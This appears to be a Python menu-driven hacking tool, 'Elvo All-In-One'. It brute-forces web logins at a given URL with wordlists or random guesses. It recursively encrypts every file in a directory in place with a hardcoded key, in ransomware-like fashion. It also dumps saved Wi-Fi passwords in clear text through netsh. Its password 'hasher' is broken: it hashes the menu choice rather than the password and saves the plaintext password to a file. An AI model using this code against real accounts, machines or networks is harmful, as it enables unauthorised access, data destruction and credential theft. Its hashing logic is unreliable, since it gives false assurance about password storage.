# ----------Banner--------
from pyfiglet import Figlet
# from termcolor import colored, cprint

# http://www.figlet.org/examples.html - fonts
# Text colors:
#
# grey
# red
# green
# yellow
# blue
# magenta
# cyan
# white

# Text highlights:
#
# on_grey
# on_red
# on_green
# on_yellow

# Attributes:
#
# bold
# dark
# underline
# blink
# reverse
# concealed
from os import system, name

# ----------Fernet imports----------
import base64
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet, InvalidToken
import hashlib
# -----------Brute Force imports-------
import requests
import random
# -----------Check+Hasher imports-------
import re
import bcrypt
# -----------Wifi SSIDs imports-------
import subprocess

# -----------IMPORTS-------

# TODO: -----------TODO-------
'''
- Add English only to the Password Checker Hasher
- Add File with Passwords to hash
-Error Check
-


'''
# TODO: -----------TODO-------
class Wipe(object):
    def __repr__(self):
        return '\n' * 10000
wipe = Wipe()

# custom_fig = Figlet(font='5lineoblique')
# print(custom_fig.renderText("Welcome To Elvo All In One Tool"))
print('Welcome to All-In-One Elvo Tool')

class AllinOne:
    def HackTools(Elvo):

        # custom_menu = Figlet(font='digital')
        print(('''
Welcome to the Main Menu!

 | For | Brute-Force >             [1]
 | For | Elvo Encryption >         [2]
 | For | Password Checker+Hasher > [3]
 | For | Wifi Intelligence >       [4]

 '''))
        User_Choice = input("And your choice would be?\n...: ")
        print(wipe)
        print("You chose...: ", User_Choice)

        # Test module!
        # if User_Choice == 'BRUTE FORCE':
        #     print("Nice")
        # elif User_Choice == 'AES':
        #     print("Nice")
        # else:
        #     print("Not an option :(")

        # -----------------------Brute Force-----------------------
        if User_Choice == '1':
            def QUESTIONBRUTEFORCE():
                # custombruteforce = Figlet(font='bubble')
                #
                # print(custombruteforce.renderText('''"Welcome To Elvo\n
                #                                   Brute-Forcer'''))
                print('Welcome To The Brute-Forcer')

                BruteIntro = print('''How would you like to Brute Force?

1.With a Worldlist [1]
2.With Random Numbers[2]
3.With Your Own Characters[3]
4. To Main Menu [4]
''')
                BruteChoice = input(str("And your choice would be?\n...: "))
                print("You chose...: ", BruteChoice)

                if BruteChoice == "1":

                    url = input('Place the URL: ')
                    username = input('Place the username: ')

                    # chars =  "123"

                    def send_request(username, passwd):
                        data = {
                            "username": username,
                            "password": passwd
                        }

                        r = requests.get(url, data=data)
                        return r

                    def implist():
                        print('ADD .txt TO THE FILE!')
                        worldlist = input('Wordlist Path...: ')
                        try:
                            file = open(worldlist, 'r')
                            tries = file.read().split('\n')
                            file.close()
                            return tries
                        except FileNotFoundError:
                            return print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n'''), QUESTIONBRUTEFORCE()

                    def main(tries):
                        for passwd in tries:
                            r = send_request(username, passwd)

                            if 'failed to login' in r.text.lower():
                                print(f"Incorrect {passwd}\n")
                            else:
                                print(f"Correct Password | {passwd} | !\n")
                                break

                    tries = implist()
                    main(tries)

                elif BruteChoice == "2":

                    url = input('Place the URL: ')
                    username = input('Place the username: ')
                    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
                    try:

                        def send_request(username, passwd):
                            data = {
                                "username": username,
                                "password": passwd
                            }

                            r = requests.get(url, data=data)
                            return r

                        def main():
                            while True:
                                rndpasswd = random.choices(chars, k=2)
                                # k= is the password length.
                                passwd = "".join(rndpasswd)
                                # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                                r = send_request(username, passwd)

                                if 'failed to login' in r.text.lower():
                                    print(f"Incorrect {passwd}\n")
                                else:
                                    print(f"Correct Password | {passwd} | !\n")
                                    break

                        main()
                    except requests.exceptions.MissingSchema:
                        return print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n'''), QUESTIONBRUTEFORCE()

                elif BruteChoice == "3":

                    url = input('Place the URL: ')
                    username = input('Place the username: ')
                    chars = input('Write the characters to use')
                    try:

                        def send_request(username, passwd):
                            data = {
                                "username": username,
                                "password": passwd
                            }

                            r = requests.get(url, data=data)
                            return r

                        def main():
                            while True:
                                rndpasswd = random.choices(chars, k=2)
                                # k= is the password length.
                                passwd = "".join(rndpasswd)
                                # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                                r = send_request(username, passwd)

                                if 'failed to login' in r.text.lower():
                                    print(f"Incorrect {passwd}\n")
                                else:
                                    print(f"Correct Password | {passwd} | !\n")
                                    break

                        main()
                    except requests.exceptions.MissingSchema:
                        return print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n'''), QUESTIONBRUTEFORCE()

                elif BruteChoice == '4':
                    print('\n>>>Back To the Main Menu>>>\n')
                    return object.HackTools('Elvo.a')

                else:
                    print('''
                    \n-----ERROR-----
                    Something Isn't right
                    -----ERROR-----\n''')
                    return QUESTIONBRUTEFORCE()

            QUESTIONBRUTEFORCE()
        # -----------------------Brute Force-----------------------

        # -----------------------Fernet-----------------------
        elif User_Choice == '2':
            # custombruteforce = Figlet(font='bubble')
            # print(custombruteforce.renderText("Welcome To Elvo\n "
            #                                   "Encryptor"))
            #https://stackoverflow.com/questions/61141744/decrypting-multiple-files-using-cryptography-fernet
            print('Welcome To The Encryptor')

            # ---------Generate Key-------------

            try:
                file = open('fernetkey.key', 'rb')
                key = file.read()
                file.close()
            except FileNotFoundError:
                key = Fernet.generate_key()
                file = open('fernetkey.key', 'wb')
                file.write(key)
                file.close()

            password_provided = "The Password That Is Being UseD HerE iS Kika"  # This is input in the form of a string
            password = password_provided.encode()  # Convert to type bytes
            salt = b'in7\xf9\xdc\xe1\xf9$\xda\x0c\x1b\xffT\x12QZ\x07\\\\\x0e\xc6\xeb\xe4\xec\x80\xfa\xc70 \xa4\x17`\xe6[\xb5R\xe5E\xcdm\xa3\xadf\xaf\x19\xc6\xa1\x14=\x80E\x1b\xfd\xd9\x84\x00Bk:\x03\xb3\xd3\x9d\xf5m\xf7\xa5\xb5\xd8\x8b\x17\x1b\xfa\xb6f\x04\x9c?\xc9R\xab\x0c\xcd\xac\x04=\xb0\xbeRl|\x9cY$\xd2\xbc\xc6|\xbbe{8:\x94\x0f\x0b\x1b\xf1\xb82l\xb8B\xf7ri8t*\xe6\xa5\x9f\xcc\xb2\xa9OW\'K\xcb\x9f\x9f\x12\xab\xb5\xde:\xf8\xb7X67\xf90\x10\xb6_\xec\'\x1a2\xea\x1a\xc7\xef\xbc\xce\xd7\xb5\x8d\xfe5\xf9\xd8\x94O1\xfb\x10\xb0\xae\xbcK\x05f\xd3/\xea\xf9\xeb=\x99]\xc9 K\x07\x1bD(\xbbj/\xe9,\x977"#\xfa`\xb4\x83\x17\xc1\xff\xa3\x9a\x11\xf1;^\xba\xf6/\xe3\x8b\x9eAy\xb31\xed<\x92\xf3\xb9\xea}Z\x16\xb9R\xd3\xbb\x03\x17w\xe6\x00\xb7\x83\xa9\x0e\xb4\x9a\x101\x17\xd4;\xd0\xf7l\r\t'
            # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=64,
                salt=salt,
                iterations=400000,
                backend=default_backend()
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))  # Can only use kdf once

            def QUESTIONFERNET():

                FERNETQUESTION = input('''What woud you like to do?

To Encrypt   [1]
To Decrypt   [2]
To Main Menu [3]
...:''')

                if FERNETQUESTION == '1':
                    # TODO: --------------Encryption--------------
                    def getListOfFiles(dirName):
                        # create a list of file and sub directories
                        # names in the given directory
                        listOfFile = os.listdir(dirName)
                        allFiles = list()
                        # Iterate over all the entries
                        for entry in listOfFile:
                            # Create full path
                            fullPath = os.path.join(dirName, entry)
                            # If entry is a directory then get the list of files in this directory
                            if os.path.isdir(fullPath):
                                allFiles = allFiles + getListOfFiles(fullPath)
                            else:
                                allFiles.append(fullPath)

                        return allFiles
                    def main():
                        dirName = input('path...: ')
                        looptimes = input('How many times to run...: ')
                        try:
                            number = int(looptimes)
                            pass
                        except ValueError:
                            print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                            return QUESTIONFERNET()
                        looptimes = number
                        if number <= 0:
                         number = 1

                        counter = 0

                        # Get the list of all files in directory tree at given path
                        for number in range(looptimes):
                            listOfFiles = list()
                            for (dirpath, dirnames, filenames) in os.walk(dirName):
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                            # Print the files
                            for elem in listOfFiles:
                                with open(elem, 'rb') as f:
                                    data = f.read()  # Read the bytes of the input file
                                    counter +=1

                                fernet = Fernet(key)
                                encrypted = fernet.encrypt(data)

                                with open(elem, 'wb') as f:
                                    f.write(encrypted)  # Write the encrypted bytes to the output file
                        print(wipe)
                        print(f'''\n
Encryption Info:
Looptimes:{looptimes}
File Passed:{counter}
The Path:{dirName}
key:{key} ''')

                        print('\n>>>Back To the Main Menu>>>\n')
                        object.HackTools('Elvo.a')

                    main()

                elif FERNETQUESTION == '2':

                    # TODO: ------------------DECRYPTION--------------------

                    Question = input("Are you sure? Yes/No...: ").capitalize()
                    if Question == 'Yes':
                        def getListOfFiles(dirName):
                            # create a list of file and sub directories
                            # names in the given directory
                            listOfFile = os.listdir(dirName)
                            allFiles = list()
                            # Iterate over all the entries
                            for entry in listOfFile:
                                # Create full path
                                fullPath = os.path.join(dirName, entry)
                                # If entry is a directory then get the list of files in this directory
                                if os.path.isdir(fullPath):
                                    allFiles = allFiles + getListOfFiles(fullPath)
                                else:
                                    allFiles.append(fullPath)

                            return allFiles

                        def main():
                            dirName = input('path...: ')
                            looptimes = input('How many times to run...: ')
                            try:
                                number = int(looptimes)
                                pass
                            except ValueError:
                                print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                                return QUESTIONFERNET()
                            looptimes = number
                            if number <= 0:
                                number = 1

                            counter = 0

                            # Get the list of all files in directory tree at given path
                            for number in range(looptimes):
                                listOfFiles = list()
                                for (dirpath, dirnames, filenames) in os.walk(dirName):
                                    listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                # Print the files
                                for elem in listOfFiles:

                                    with open(elem, 'rb') as f:
                                        data = f.read()  # Read the bytes of the input file
                                        counter += 1

                                    fernet = Fernet(key)
                                    try:
                                        decrypted = fernet.decrypt(data)

                                        with open(elem, 'wb') as f:
                                            f.write(decrypted)

                                    except InvalidToken as e:
                                        pass
                            print(wipe)
                            print("\nNo more files to decrypt\n")
                            print(f'''
Decryption Info:
Looptimes:{looptimes}
File Passes:{counter}
The Path:{dirName}
key:{key} ''')
                            object.HackTools('Elvo.a')
                        main()

                    else:
                        print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                        return QUESTIONFERNET()

                elif FERNETQUESTION == '3':
                    print('\n>>>Back To the Main Menu>>>\n')
                    return object.HackTools('Elvo.a')


                else:
                    return print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n'''), QUESTIONFERNET()

            QUESTIONFERNET()
            # -----------------------Fernet-----------------------

            # -----------------------Password Checker+Hasher-----------------------
        elif User_Choice == '3':
            # customcheckerhasher = Figlet(font='bubble')
            #
            # print(customcheckerhasher.renderText('''Welcome To Elvo\nPassword Checker \nand Hasher'''))
            print('Welcome To Elvo Password Checker and Hasher')

            def PASSCHECKER():
                print(''' 
Here you can check if your password is strong enough
and if it is strong enough,
you can also hash it.
''')

                PASSWORDQ = input('''Test and Hash OR Main Menu? 
Test and Hash > [1]
Main Menu >     [2]
...:''')
                if PASSWORDQ == '1':
                    print(wipe)
                    print('''
Password MUST have:
1. Cant have spaces!.
2. Has to be in ENGLISH!.
3. Minimum 6 characters long.
4. Has to have at least one number.
5. Has to have at least lower case letter.
6. Has to have at least one special character.
7. Has to have at least one upper case character.
            ''')
                    PASSWORD = input('Check Your Password...:')
                    x = True
                    while x:
                        if (len(PASSWORD) < 6 or len(PASSWORD) > 100):
                            print("\nPassword length between 6 and 12 please")
                            break
                        elif not re.search("[abcdefghijklmnopqrstuvwx]", PASSWORD):
                            print("\nYou need at least one lower case letter")
                            break
                        elif not re.search("[0123456789]", PASSWORD):
                            print("\nYou need at least one number")
                            break
                        elif not re.search("[ABCDEFGHIJKLMNOPQRSTUVWX]", PASSWORD):
                            print("\nYou need at least one upper case character")
                            break
                        elif not re.search("[!@#$%]", PASSWORD):
                            print("\nYou need at least one special character please")
                            break
                        elif re.search("\s", PASSWORD):
                            print("\nYou cannot have blank spaces in your password...")
                            break

                        else:
                            print("Your Password is strong enough")
                            x = False

                            # -------------Password Hasher-------------
                            def PASSHASHER():
                                print('Hash your Password OR Main Menu')
                                PASSHASH = input('''
Hash My Password >    [1]
Main Menu  >          [2]
...: ''')
                                y = True
                                while y:
                                    if PASSHASH == '1':
                                        print(wipe)
                                        y = False
                                        PWDHASH = PASSHASH
                                        bytePWDHASH = PWDHASH.encode('utf-8')

                                        SALT = bcrypt.gensalt()
                                        hash = bcrypt.hashpw(bytePWDHASH, SALT).decode('utf-8')

                                        with open('Passwordhash.txt', 'w') as f:
                                            f.write('The Password you hashed: ')
                                            f.write(PASSWORD)
                                            f.write('\nYour Password Hash: ')
                                            f.write(hash)

                                        print(wipe)
                                        print('Password Info - ')
                                        print('Your Password: ', PASSWORD)
                                        print('Your Hashed Password:', hash)
                                        print('Your Passwords are save in:', os.getcwd() + '\Passwordhash.txt')

                                        print('>>>Back To the Main Menu>>>')
                                        return object.HackTools('Elvo.a')
                                    elif PASSHASH == '2':
                                        break
                                    else:
                                        print(wipe)
                                        print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                                    return PASSHASHER()

                                if y:
                                    print(wipe)
                                    print('\n>>>Back To the Main Menu>>>\n')
                                    return object.HackTools('Elvo.a')

                            # -------------Password Hasher-------------
                            PASSHASHER()
                            break

                    if x:
                        print(wipe)
                        print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')

                        PASSCHECKER()
                elif PASSWORDQ == '2':
                    print(wipe)
                    print('\n>>>Back To the Main Menu>>>\n')
                    object.HackTools('Elvo.a')
                else:
                    print(wipe)
                    print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                    PASSCHECKER()

            PASSCHECKER()

            # -----------------------Password Checker+Hasher-----------------------

            # -----------------------Wifi SSIDs-----------------------
        elif User_Choice == '4':

            # customwifissid = Figlet(font='bubble')
            # print(customwifissid.renderText("Welcome To Elvo\n "
            #                                   "Wifi Info"))
            print(wipe)
            print('Welcome To Wifi Intelligence')
            def WIFISSID():
                WIFINETAVA = input('''
Known Networks OR Available Networks?
Known Networks >     [1]
Available Networks > [2]
Connect Manually >   [3]
Main Menu >          [4]                
...:''')
                if WIFINETAVA == '1':
                    print(wipe)

                    print('All Known Networks OR Connect OR Main Menu')
                    WIFIQU = input('''
All Known Networks >         [1]
Connect To A Known network > [2]
Connect Manually             [3]
Main Menu >                  [4] 
...:''')
                    if WIFIQU == '1':
                        print(wipe)

                        CMD = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
                        # .stdout.decode - shows all the wifi names in a table

                        WIFINAMES = (re.findall("All User Profile     : (.*)\r", CMD))
                        # finds all the "All user Profile" text in the CMD

                        WIFILISTNAMES = []
                        # creating an empty list for all the wifi usernames and password to be saved in

                        if len(WIFINAMES) != 0:
                            for name in WIFINAMES:
                                WIFIPROFILE = {}
                                # dictionary for each wifi profile

                                PROFILEINFO = subprocess.run(["netsh", "wlan", "show", "profile", name],
                                                             capture_output=True).stdout.decode()

                                if re.search("Security key           : Absent", PROFILEINFO):
                                    continue
                                else:
                                    WIFIPROFILE["ssid"] = name
                                    PROFILEINFOPASS = subprocess.run(
                                        ["netsh", "wlan", "show", "profile", name, "key=clear"],
                                        capture_output=True).stdout.decode()
                                    PASSWORD = re.search("Key Content            : (.*)\r", PROFILEINFOPASS)
                                    if PASSWORD == None:
                                        WIFIPROFILE["password"] = None

                                    else:
                                        WIFIPROFILE["password"] = PASSWORD[1]

                                    WIFILISTNAMES.append(WIFIPROFILE)

                                    def WIFICONNECTION():
                                        print('\nConnect to WiFi OR Main Menu')
                                        WIFICON = input('''
Connect To The WiFi >    [1]
Main Menu >              [2]

...:''')
                                        if WIFICON == '1':
                                            print(wipe)
                                            print('\n-----KNOWN NETWORKS-----')
                                            for i in enumerate(WIFINAMES[:]):
                                                print(*i)
                                                for n in range(0):
                                                    print(n)
                                            print('\n-----KNOWN NETWORKS-----')
                                            # -----------------------Wifi Known Network connector-----------------------
                                            print('Choose your Network.')

                                            def WIFINET():
                                                valid = False
                                                while not valid:  # loop until the user enters a valid int
                                                    try:
                                                        WIFINETWORK = int(input('...: '))
                                                        valid = True  # if this point is reached, x is a valid int
                                                        WIFINETCON = subprocess.run(["netsh", "wlan", "connect",
                                                                                     f"ssid={WIFINAMES[WIFINETWORK]}",
                                                                                     f"name={WIFINAMES[WIFINETWORK]}"])
                                                        WIFINETCON
                                                        object.HackTools('Elvo.a')
                                                    except ValueError:
                                                        print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                                                        WIFINET()

                                            WIFINET()


                                        elif WIFICON == '2':
                                            print(wipe)
                                            print('\nAs you wish')
                                            object.HackTools('Elvo.a')
                                        else:
                                            print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                                            WIFICONNECTION()
                                        # -----------------------Wifi Known Network connector-----------------------

                        for x in range(len(WIFILISTNAMES)):
                            print('\n--------------------Wifi Network-----------------------')
                            print(WIFILISTNAMES[x])
                            print(f'---------------------------------------------------------')
                        WIFICONNECTION()

                    # -----------------------Wifi Available Network-----------------------
                    elif WIFIQU == '2':
                        print(wipe)
                        CMD = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
                        # .stdout.decode - shows all the wifi names in a table

                        WIFINAMES = (re.findall("All User Profile     : (.*)\r", CMD))
                        # finds all the "All user Profile" text in the CMD
                        print('\n-----KNOWN NETWORKS-----')
                        for i in enumerate(WIFINAMES[:]):
                            print(*i)
                            for n in range(0):
                                print(n)
                        print('\n-----KNOWN NETWORKS-----')
                        # -----------------------Wifi Known Network connector-----------------------
                        print('Choose your Network.')

                        def WIFINET():
                            valid = False
                            while not valid:  # loop until the user enters a valid int
                                try:
                                    WIFINETWORK = int(input('...: '))
                                    print('\n')
                                    valid = True  # if this point is reached, x is a valid int
                                    WIFINETCON = subprocess.run(
                                        ["netsh", "wlan", "connect", f"ssid={WIFINAMES[WIFINETWORK]}",
                                         f"name={WIFINAMES[WIFINETWORK]}"])
                                    print('\n\n')
                                    WIFINETCON
                                    object.HackTools('Elvo.a')
                                except ValueError:
                                    print(wipe)
                                    print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                                    WIFINET()

                        WIFINET()


                    elif WIFIQU == '3':
                        print(wipe)
                        print('\n>>>Back To the Main Menu>>>\n')
                        return object.HackTools('Elvo.a')

                    else:
                        print(wipe)
                        print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                        return WIFISSID()

                elif WIFINETAVA == '2':
                    print(wipe)
                    AVACMD = subprocess.run(["netsh", "wlan", "show", "networks"], capture_output=True).stdout.decode()
                    print(AVACMD)
                    print('\n>>>Back To the Main Menu>>>\n')
                    object.HackTools('Elvo.a')

                # elif WIFINETAVA == '3':
                #     WIFINAMEMAN = input('Network Name...: ')
                #     WIFIPASSMAN = input('Network Pass...: ')
                #
                #     CMD = subprocess.run(
                #         ["netsh", "wlan", "set", "hostednetwork", "mode=allow", f"ssid={WIFINAMEMAN}",
                #          f"key={WIFIPASSMAN}"], capture_output=True).stdout.decode()
                #     CONNECTCMD = subprocess.run(
                #         ["netsh", "wlan", "connect", f"ssid={WIFINAMEMAN}",
                #          f"name={WIFINAMEMAN}"])
                #     print('Connecting... \n', CMD, CONNECTCMD)

                elif WIFINETAVA == '3':
                    print('')

                elif WIFINETAVA == '4':
                    print(wipe)
                    print('\n>>>Back To the Main Menu>>>\n')
                    object.HackTools('Elvo.a')

                else:
                    print(wipe)
                    print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                    WIFISSID()

                    # -----------------------Wifi Available Network-----------------------

            WIFISSID()
            # -----------------------Wifi SSIDs-----------------------
        else:
            print(wipe)
            print('''
-----ERROR-----
Something Isn't right
-----ERROR-----'''),'\n>>>Back To the Main Menu>>>\n', object.HackTools('Elvo.a')


object = AllinOne
object.HackTools('Elvo.a')